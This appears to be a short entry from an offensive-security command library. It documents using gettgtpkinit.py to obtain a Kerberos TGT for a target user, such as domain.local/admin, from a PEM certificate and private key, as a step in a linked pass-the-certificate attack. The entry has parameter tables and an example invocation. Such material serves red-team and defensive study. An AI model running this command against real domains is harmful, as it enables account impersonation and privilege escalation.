---
id: a9b32d73-00eb-4e09-bbe0-39534b8057cc
name: get-tgt-pem-certificate-private-key
type: command
executor: python
data: >-
  gettgtpkinit.py -cert-pem $_PEM_CERT_PATH -key-pem $_PEM_KEY_PATH
  $_DOMAIN/$_TARGET_USER -hashes :$_PASSWORD $_TGT_CCACHE
output: null
created_at: '2023-04-06T03:56:06.176766+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - kerberos
  - tgt
  - pkinit
verified: true
validated: true
---

# get-tgt-pem-certificate-private-key

## Command

```python
gettgtpkinit.py -cert-pem $_PEM_CERT_PATH -key-pem $_PEM_KEY_PATH $_DOMAIN/$_TARGET_USER -hashes :$_PASSWORD $_TGT_CCACHE
```

## Description

Generates a TGT using separate PEM certificate and private key files for PKINIT authentication.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -cert-pem | Path to PEM certificate file | Yes |
| -key-pem | Path to PEM private key file | Yes |
| $_DOMAIN/$_TARGET_USER | Target principal | Yes |
| -hashes | Optional password/hash | No |
| $_TGT_CCACHE | Output ccache | Yes |

## Examples

### Basic Usage

```python
gettgtpkinit.py -cert-pem cert.pem -key-pem key.pem domain.local/admin tgt.ccache
```

## Expected Output

Successfully created TGT in tgt.ccache for the specified user.

## Related

- [[procedures/Pass-The-Certificate-Attack]]
